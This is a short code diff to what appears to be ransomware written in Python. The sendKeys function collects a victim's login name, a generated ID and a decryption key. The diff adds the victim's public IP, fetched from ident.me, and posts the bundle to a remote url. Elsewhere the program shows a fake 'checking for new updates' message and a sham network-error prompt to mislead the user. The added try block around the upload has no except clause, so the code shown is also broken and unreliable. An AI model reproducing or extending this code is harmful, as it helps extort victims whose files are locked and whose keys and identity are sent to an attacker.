@@ -35,14 +35,22 @@ def sendKeys():
     id = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
     user = os.getlogin()
     key = decryptPlease
+    try:
+        ip = r.get("https://ident.me/").text
+    except:
+        pmb.confirm("Please make sure that you are connected to the internet and try again.", "Network Error")
+        exit()
 
     jsonFormat = {
         "uniqueId": id,
         "user": user,
-        "key": key
+        "key": key,
+        "ip": ip
     }
 
-    r.post(url, data=json.dumps(jsonFormat))
+    try:
+        r.post(url, data=json.dumps(jsonFormat))
+
 
 def findFiles():
     print("Please be patient, checking for new updates...\n")
